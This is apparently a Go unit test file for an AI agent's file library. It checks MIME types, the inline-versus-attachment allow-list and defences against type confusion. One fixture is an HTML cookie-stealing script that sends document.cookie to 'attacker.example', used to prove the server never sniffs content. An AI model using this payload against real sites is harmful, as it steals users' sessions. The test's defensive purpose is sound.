// Omnipus - Ultra-lightweight personal AI agent
// License: MIT
// Copyright (c) 2026 Omnipus contributors

package gateway

import (
	"mime"
	"net/http"
	"sort"
	"strings"
	"testing"

	gen "github.com/elicify-ai/omnipus/pkg/api/generated"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ADR-067 stage 1, unit A1 — the compiled-in Library type table.
//
// Every expected value below is transcribed from the specification
// (docs/internal/specs/adr-067-knowledge-base-and-preview-spec.md §10.4,
// FR-009, FR-015..FR-016) or from the registered IANA / MDN media type for the
// format. None of it was read back off the implementation.

// specInlineAllowList is §10.4's table, transcribed row by row. It is the
// oracle for test 3b — if the production allow-list and this disagree, one of
// them changed without the other, which is the whole point.
var specInlineAllowList = map[string]string{
	// Row "Active documents"
	".html": "active document",
	".htm":  "active document",
	// Row "Bundle code"
	".css": "bundle code",
	".js":  "bundle code",
	// Row "Fonts"
	".woff2": "font",
	".woff":  "font",
	".ttf":   "font",
	".otf":   "font",
	// Row "Images" — eight raster extensions
	".png":  "image",
	".jpg":  "image",
	".jpeg": "image",
	".gif":  "image",
	".webp": "image",
	".avif": "image",
	".ico":  "image",
	".bmp":  "image",
	// Row ".svg"
	".svg": "svg",
	// Row "Media" — seven audio, three video
	".mp3":  "media",
	".m4a":  "media",
	".aac":  "media",
	".ogg":  "media",
	".opus": "media",
	".wav":  "media",
	".flac": "media",
	".mp4":  "media",
	".webm": "media",
	".mov":  "media",
	// Row "Inert text"
	".txt":  "inert text",
	".md":   "inert text",
	".json": "inert text",
}

// specAudioExtensions is §10.4's audio set — "the seven audio extensions" of
// FR-015c, which FR-009 and MV-14 require to have a specific type each.
var specAudioExtensions = []string{".mp3", ".m4a", ".aac", ".ogg", ".opus", ".wav", ".flac"}

// specVideoExtensions is §10.4's "three video extensions".
var specVideoExtensions = []string{".mp4", ".webm", ".mov"}

// specTypedButNotInline is the one extension FR-015c requires in the type table
// while §10.4 keeps it OFF the inline allow-list. Named here so test 3b can
// assert the difference between the two sets exactly, instead of tolerating an
// unexplained surplus.
var specTypedButNotInline = []string{".pdf"}

// specContentTypes is the expected Content-Type per extension. Values are the
// registered media types (IANA; fonts per RFC 8081), not values copied from
// the implementation. Text types carry charset=utf-8 because the Library serves
// UTF-8 bytes and X-Content-Type-Options: nosniff forbids the browser from
// inferring it.
var specContentTypes = map[string]string{
	".html":  "text/html; charset=utf-8",
	".htm":   "text/html; charset=utf-8",
	".css":   "text/css; charset=utf-8",
	".js":    "text/javascript; charset=utf-8",
	".woff2": "font/woff2",
	".woff":  "font/woff",
	".ttf":   "font/ttf",
	".otf":   "font/otf",
	".png":   "image/png",
	".jpg":   "image/jpeg",
	".jpeg":  "image/jpeg",
	".gif":   "image/gif",
	".webp":  "image/webp",
	".avif":  "image/avif",
	".ico":   "image/vnd.microsoft.icon",
	".bmp":   "image/bmp",
	".svg":   "image/svg+xml",
	".mp3":   "audio/mpeg",
	".m4a":   "audio/mp4",
	".aac":   "audio/aac",
	".ogg":   "audio/ogg",
	".opus":  "audio/ogg",
	".wav":   "audio/wav",
	".flac":  "audio/flac",
	".mp4":   "video/mp4",
	".webm":  "video/webm",
	".mov":   "video/quicktime",
	".txt":   "text/plain; charset=utf-8",
	".md":    "text/markdown; charset=utf-8",
	".json":  "application/json",
	".pdf":   "application/pdf",
}

func sortedKeys[V any](m map[string]V) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

// TestLibraryTypeTable_MatchesInlineAllowList is TDD-plan test 3b (FR-015c).
//
// Three properties, because "the same set" is two claims plus one documented
// exception:
//   - the production allow-list is exactly §10.4's;
//   - every allow-listed extension has a type (the round-4 defect: .css and .js
//     were inline-allowed with no type, so with the octet-stream default and
//     mandatory nosniff every browser refuses a bundle's own stylesheet and
//     script, breaking US-1 AS-4);
//   - the only extension typed but not inline is .pdf, which FR-015c requires in
//     the table and §10.4 keeps off the allow-list. Anything else in that
//     difference is an extension nobody decided on.
func TestLibraryTypeTable_MatchesInlineAllowList(t *testing.T) {
	assert.Equal(t, sortedKeys(specInlineAllowList), sortedKeys(libraryInlineExtensions),
		"the inline allow-list must be exactly the set in spec §10.4")

	for _, ext := range sortedKeys(specInlineAllowList) {
		ct, ok := libraryExtContentTypes[ext]
		assert.True(t, ok, "%s is inline-allowed by §10.4 but has no entry in the type table", ext)
		assert.NotEqual(t, libraryDefaultContentType, ct,
			"%s is inline-allowed by §10.4 and must have a specific type, not the default", ext)
	}

	var surplus []string
	for _, ext := range sortedKeys(libraryExtContentTypes) {
		if _, inline := specInlineAllowList[ext]; !inline {
			surplus = append(surplus, ext)
		}
	}
	assert.Equal(t, specTypedButNotInline, surplus,
		"the type table may exceed the §10.4 allow-list by exactly the documented typed-but-attachment extensions")
}

// TestLibraryContentType_TableCoverage covers FR-015c's enumerated minimum:
// .html/.htm, .css, .js, the four webfont extensions, the eight image
// extensions including .svg, the seven audio extensions, the three video
// extensions, plus .pdf, .txt, .md and .json — each with its registered type.
func TestLibraryContentType_TableCoverage(t *testing.T) {
	// Guard the oracle itself: FR-015c states the counts, so assert them here
	// rather than trusting that the transcription above is complete.
	require.Len(t, specAudioExtensions, 7, "FR-015c: seven audio extensions")
	require.Len(t, specVideoExtensions, 3, "FR-015c: three video extensions")
	require.Len(t, specInlineAllowList, 30, "spec §10.4: 2+2+4+8+1+10+3 extensions")
	require.Len(t, specContentTypes, len(specInlineAllowList)+len(specTypedButNotInline),
		"every allow-listed extension plus .pdf must have an expected type")

	for _, ext := range sortedKeys(specContentTypes) {
		assert.Equal(t, specContentTypes[ext], libraryContentTypeForExt(ext),
			"Content-Type for %s", ext)
	}
}

// TestLibraryAudioExtensions_HaveSpecificTypes is FR-009 / MV-14: each supported
// audio extension returns its specific MIME type, never application/octet-stream.
// Asserted through the same lookup the handler uses.
func TestLibraryAudioExtensions_HaveSpecificTypes(t *testing.T) {
	for _, ext := range specAudioExtensions {
		got := libraryContentTypeForExt(ext)
		assert.NotEqual(t, libraryDefaultContentType, got,
			"%s must not be served as the octet-stream default — browsers refuse to play it", ext)
		assert.True(t, strings.HasPrefix(got, "audio/"),
			"%s must be served as an audio/* type, got %q", ext, got)
		assert.Equal(t, specContentTypes[ext], got, "specific type for %s", ext)
	}
}

// TestLibraryVideoExtensions_HaveSpecificTypes guards the trap in Go's own
// built-in table, where .webm is "audio/webm": a video served as audio plays
// with no picture.
func TestLibraryVideoExtensions_HaveSpecificTypes(t *testing.T) {
	for _, ext := range specVideoExtensions {
		got := libraryContentTypeForExt(ext)
		assert.True(t, strings.HasPrefix(got, "video/"),
			"%s must be served as a video/* type, got %q", ext, got)
		assert.Equal(t, specContentTypes[ext], got, "specific type for %s", ext)
	}
}

// TestLibraryContentType_UnknownExtensionIsOctetStreamAttachment is FR-015c's
// one stated default, no second guess: an extension absent from the table is
// application/octet-stream AND an attachment. Covers DS-5 #9 (audio.aiff, an
// unsupported audio format → download card, E-14) and DS-5 #10 (archive.zip →
// download card unchanged, US-1 AS-7).
func TestLibraryContentType_UnknownExtensionIsOctetStreamAttachment(t *testing.T) {
	cases := []struct {
		name string
		why  string
	}{
		{"archive.zip", "DS-5 #10 — unsupported binary, download card unchanged"},
		{"audio.aiff", "DS-5 #9 — unsupported audio, download card"},
		{"report.docx", "office documents are not rendered (NB-2)"},
		{"payload.exe", "no reason to name an executable anything specific"},
		{"notes.unknownext", "an extension nobody has decided on"},
		{"README", "no extension at all"},
		{".gitignore", "a dotfile is not an extension"},
		{".html", "a file literally named .html is a dotfile, not an HTML document"},
		{"", "empty name"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, "application/octet-stream", libraryContentTypeForName(tc.name), tc.why)
			assert.Equal(t, gen.LibraryInlineDispositionDispositionAttachment,
				libraryDispositionForName(tc.name), tc.why)
		})
	}
}

// TestLibraryDisposition_AllowListOnly: inline is the allow-list and nothing
// else. .pdf is the deliberate case — it has a type but is still an attachment,
// because PDF.js fetches its bytes over the authenticated endpoint and a PDF
// therefore never becomes a browser document (FR-018).
func TestLibraryDisposition_AllowListOnly(t *testing.T) {
	for _, ext := range sortedKeys(specInlineAllowList) {
		assert.Equal(t, gen.LibraryInlineDispositionDispositionInline,
			libraryDispositionForExt(ext), "%s is on the §10.4 allow-list", ext)
	}
	for _, ext := range specTypedButNotInline {
		assert.Equal(t, gen.LibraryInlineDispositionDispositionAttachment,
			libraryDispositionForExt(ext),
			"%s has a type but §10.4 keeps it off the inline allow-list", ext)
	}
	assert.Equal(t, gen.LibraryInlineDispositionDispositionInline,
		libraryDispositionForName("reports/q3/index.html"))
	assert.Equal(t, gen.LibraryInlineDispositionDispositionAttachment,
		libraryDispositionForName("reports/q3/statement.pdf"))
}

// TestLibraryContentType_IsCaseInsensitive — an operator's own files arrive with
// whatever case their filesystem gave them (STAGE 0: these are files Omnipus
// does not own). LOGO.PNG is a PNG.
func TestLibraryContentType_IsCaseInsensitive(t *testing.T) {
	assert.Equal(t, "image/png", libraryContentTypeForName("LOGO.PNG"))
	assert.Equal(t, "text/html; charset=utf-8", libraryContentTypeForName("Report.HTML"))
	assert.Equal(t, "audio/aac", libraryContentTypeForExt(".AAC"))
	assert.Equal(t, gen.LibraryInlineDispositionDispositionInline,
		libraryDispositionForName("Photos/HOLIDAY.JPEG"))
}

// TestLibraryExtOf_ExtractsFromPath — the extension is the file's, not the
// directory's.
func TestLibraryExtOf_ExtractsFromPath(t *testing.T) {
	cases := map[string]string{
		"index.html":                  ".html",
		"reports/q3/index.html":       ".html",
		"a.b/c.d/report.MD":           ".md",
		"archive.tar.gz":              ".gz",
		"dir.with.dots/plainfile":     "",
		`windows\style\path\logo.png`: ".png",
		"trailing.":                   ".",
		".env":                        "",
		"noext":                       "",
		"":                            "",
	}
	for name, want := range cases {
		assert.Equal(t, want, libraryExtOf(name), "extension of %q", name)
	}
}

// hostRegistryStub installs a value in the process-wide stdlib MIME registry —
// the same registry mime.TypeByExtension answers from, and the one FR-015b
// forbids the Library from consulting. It asserts the injection took effect,
// because a test whose setup silently failed proves nothing, and restores the
// previous value afterwards.
func hostRegistryStub(t *testing.T, ext, typ string) {
	t.Helper()
	before := mime.TypeByExtension(ext)
	require.NoError(t, mime.AddExtensionType(ext, typ))
	require.Equal(t, typ, mime.TypeByExtension(ext),
		"positive control: the host MIME registry must now answer %q for %s — "+
			"without this the test could pass because the injection failed", typ, ext)
	t.Cleanup(func() {
		restore := before
		if restore == "" {
			// The stdlib has no removal API; leave the extension pointing at the
			// default, which is inert for anything that reads it later.
			restore = "application/octet-stream"
		}
		_ = mime.AddExtensionType(ext, restore)
	})
}

// TestLibraryContentType_IgnoresHostMimeRegistry_KnownExtension is FR-015b for
// an extension the table has: the table is the ONLY source of the type, so a
// host registry that says otherwise is ignored rather than preferred.
//
// .avif is used because Go's built-in table has it ("image/avif"), which makes
// the restore in hostRegistryStub exact on every machine.
func TestLibraryContentType_IgnoresHostMimeRegistry_KnownExtension(t *testing.T) {
	hostRegistryStub(t, ".avif", "application/x-host-registry-says-so")

	assert.Equal(t, "image/avif", libraryContentTypeForExt(".avif"),
		"FR-015b: the compiled-in table is the only source of the type")
	assert.Equal(t, "image/avif", libraryContentTypeForName("assets/hero.avif"))
}

// TestLibraryContentType_IgnoresHostMimeRegistry_UnknownExtension is FR-015b for
// an extension the table does NOT have — the case a fallback would reach.
//
// This is the concrete divergence FR-015b names: on a developer Mac
// /etc/apache2/mime.types answers for extensions Go's built-in table lacks, and
// in a scratch container it does not. Injecting the Mac's answer for .aiff makes
// the two machines identical for the duration of the test, so the assertion has
// the same meaning in CI as it does here — a fallback implementation is RED on
// both, instead of green in the container and red on the laptop.
//
// .aiff is also DS-5 #9 / E-14: an unsupported audio format must produce a
// download card, and it would not if the host registry could talk the Library
// into calling it audio.
func TestLibraryContentType_IgnoresHostMimeRegistry_UnknownExtension(t *testing.T) {
	hostRegistryStub(t, ".aiff", "audio/x-aiff")

	assert.Equal(t, "application/octet-stream", libraryContentTypeForExt(".aiff"),
		"FR-015b: an extension absent from the table is octet-stream, whatever the host registry says")
	assert.Equal(t, gen.LibraryInlineDispositionDispositionAttachment,
		libraryDispositionForName("clips/interview.aiff"),
		"E-14 / DS-5 #9: an unsupported audio format is a download card")
}

// libraryTypeConfusionCase is data only. It carries no assertions of its own —
// every case runs through typeConfusionRunner below, so "a case that asserts
// nothing" is not expressible (TDD plan test 59).
type libraryTypeConfusionCase struct {
	// ext is the extension under test, from the §10.4 allow-list.
	ext string
	// payload is bytes whose CONTENT is a different format from what ext names.
	// This is the confusion: a file called logo.png whose bytes are a scripted
	// HTML document.
	payload []byte
	// sniffsAs is what content sniffing would conclude from payload. Asserted,
	// so an inert payload (random bytes, an empty file) fails the case instead
	// of quietly making it prove nothing.
	sniffsAs string
}

const (
	// A document that is unmistakably active if a browser is ever talked into
	// believing it: it runs script and reaches an external origin.
	confusionHTMLPayload = `<!doctype html><html><head><title>confusion</title></head>` +
		`<body><script>fetch("https://attacker.example/steal?c="+document.cookie)</script></body></html>`
	// For .html/.htm the confusion has to run the other way — a file named
	// .html whose bytes are a PDF.
	confusionPDFPayload = "%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"

	sniffedHTML = "text/html; charset=utf-8"
	sniffedPDF  = "application/pdf"
)

// activeSniffTypes is the closed set of sniff results a confusion case may
// declare. Both are document types — formats a browser would ACT on. An inert
// payload sniffs to application/octet-stream or text/plain and is rejected,
// which is what stops a case from being weakened into a decoration.
var activeSniffTypes = map[string]bool{sniffedHTML: true, sniffedPDF: true}

func htmlConfusionCase(ext string) libraryTypeConfusionCase {
	return libraryTypeConfusionCase{ext: ext, payload: []byte(confusionHTMLPayload), sniffsAs: sniffedHTML}
}

// libraryTypeConfusionCases holds one case per inline allow-list extension.
// FR-016: adding an extension to the allow-list without adding a case here
// fails the build, via TestInlineAllowList_EveryExtensionHasATypeConfusionCase.
var libraryTypeConfusionCases = []libraryTypeConfusionCase{
	// Active documents — confused the other way: PDF bytes under an HTML name.
	{ext: ".html", payload: []byte(confusionPDFPayload), sniffsAs: sniffedPDF},
	{ext: ".htm", payload: []byte(confusionPDFPayload), sniffsAs: sniffedPDF},
	// Bundle code
	htmlConfusionCase(".css"),
	htmlConfusionCase(".js"),
	// Fonts
	htmlConfusionCase(".woff2"),
	htmlConfusionCase(".woff"),
	htmlConfusionCase(".ttf"),
	htmlConfusionCase(".otf"),
	// Images
	htmlConfusionCase(".png"),
	htmlConfusionCase(".jpg"),
	htmlConfusionCase(".jpeg"),
	htmlConfusionCase(".gif"),
	htmlConfusionCase(".webp"),
	htmlConfusionCase(".avif"),
	htmlConfusionCase(".ico"),
	htmlConfusionCase(".bmp"),
	// SVG — scriptable when opened as a document, which is why it gets a case
	// like every other member rather than an exemption.
	htmlConfusionCase(".svg"),
	// Media
	htmlConfusionCase(".mp3"),
	htmlConfusionCase(".m4a"),
	htmlConfusionCase(".aac"),
	htmlConfusionCase(".ogg"),
	htmlConfusionCase(".opus"),
	htmlConfusionCase(".wav"),
	htmlConfusionCase(".flac"),
	htmlConfusionCase(".mp4"),
	htmlConfusionCase(".webm"),
	htmlConfusionCase(".mov"),
	// Inert text
	htmlConfusionCase(".txt"),
	htmlConfusionCase(".md"),
	htmlConfusionCase(".json"),
}

// TestInlineAllowList_EveryExtensionHasATypeConfusionCase is FR-016's gate.
// The allow-list is a table and the cases are a table; every member of the
// former must appear in the latter, and no case may exist for an extension
// that is not on the allow-list (that would be a case guarding nothing).
//
// This is the build gate: `go test` is what CI runs, so adding an extension
// without a case turns the suite red.
func TestInlineAllowList_EveryExtensionHasATypeConfusionCase(t *testing.T) {
	covered := map[string]int{}
	for _, c := range libraryTypeConfusionCases {
		covered[c.ext]++
	}

	for _, ext := range sortedKeys(libraryInlineExtensions) {
		assert.Equal(t, 1, covered[ext],
			"FR-016: %s is on the inline allow-list and needs exactly one type-confusion case "+
				"in libraryTypeConfusionCases, in the same commit that allow-listed it", ext)
	}
	for _, ext := range sortedKeys(covered) {
		assert.True(t, libraryExtIsInline(ext),
			"%s has a type-confusion case but is not on the inline allow-list", ext)
	}
}

// TestLibraryTypeConfusion_TypeComesFromExtensionNotBytes runs every case
// through one shared assertion runner (TDD plan test 59, unit level; the
// HTTP-level control is test 58 on the handler).
//
// Each case additionally carries a positive control: the payload really would
// be detected as a different, ACTIVE document type if anything sniffed it.
// Without that control a case with inert bytes passes while proving nothing.
func TestLibraryTypeConfusion_TypeComesFromExtensionNotBytes(t *testing.T) {
	for _, c := range libraryTypeConfusionCases {
		t.Run(c.ext, func(t *testing.T) {
			// Positive control 1: the payload is genuinely confusable — sniffing
			// it yields the declared type...
			require.Equal(t, c.sniffsAs, http.DetectContentType(c.payload),
				"the case payload must actually sniff to %s, or it proves nothing", c.sniffsAs)
			// ...and that type is an ACTIVE document type, not inert filler.
			require.True(t, activeSniffTypes[c.sniffsAs],
				"a confusion case must use a payload a browser would act on, got %q", c.sniffsAs)

			want, ok := specContentTypes[c.ext]
			require.True(t, ok, "no expected type transcribed from the spec for %s", c.ext)

			// Positive control 2: the confusion is real — what the bytes look
			// like differs from what the extension names.
			require.NotEqual(t, c.sniffsAs, want,
				"%s: payload and extension must name different types for this to be a confusion case", c.ext)

			// The requirement: the type comes from the extension (FR-015).
			assert.Equal(t, want, libraryContentTypeForName("evidence"+c.ext),
				"FR-015: Content-Type for %s must come from the extension, never the bytes", c.ext)
		})
	}
}
